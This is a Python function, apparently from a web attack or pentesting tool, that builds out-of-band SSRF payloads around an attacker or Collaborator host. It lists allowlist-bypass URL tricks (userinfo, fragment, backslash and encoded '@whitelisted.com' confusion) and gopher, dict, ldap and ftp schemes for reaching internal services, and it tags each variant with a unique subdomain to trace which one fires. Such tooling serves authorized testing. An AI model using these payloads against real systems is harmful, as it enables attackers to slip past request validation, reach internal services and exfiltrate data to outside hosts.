def _ssrf_oob_variants(host, tag):
    """Bypass wrappers around an attacker/Collaborator host for OOB SSRF. When
    `tag` is set, each variant gets a UNIQUE subdomain (tag+index.host) so a
    Collaborator hit can be traced back to the exact payload that fired."""
    bare = host or ""
    specs = [
        ("http://{h}",                  "http"),
        ("https://{h}",                 "https"),
        ("http://{h}/",                 "http + /"),
        ("//{h}",                       "scheme-relative //"),
        ("http://{h}/%2e%2e",           "http + /.."),
        ("http://foo@{h}",              "userinfo  foo@host"),
        ("http://{h}#@whitelisted.com", "fragment  #@whitelist"),
        ("http://{h}%23@whitelisted.com", "encoded #@whitelist"),
        ("http://{h}?@whitelisted.com", "query  ?@whitelist"),
        ("http://{h}\\@whitelisted.com", "backslash @whitelist"),
        ("http://whitelisted.com@{h}",  "whitelist@host"),
        ("http://{h}&@whitelisted.com", "ampersand"),
        ("gopher://{b}/_ssrf",          "gopher://"),
        ("dict://{b}:11211/",           "dict://"),
        ("ldap://{b}",                  "ldap://"),
        ("ftp://{b}",                   "ftp://"),
        ("http://{h}@",                 "trailing @"),
        ("{h}",                         "bare host (DNS only)"),
    ]
    out = []
    for _idx, (_tmpl, _lbl) in enumerate(specs):
        if tag and bare and "." in bare:
            h = "{}{}.{}".format(tag, _idx, bare)
        else:
            h = bare
        out.append((_tmpl.format(h=h, b=bare), _lbl))
    return out
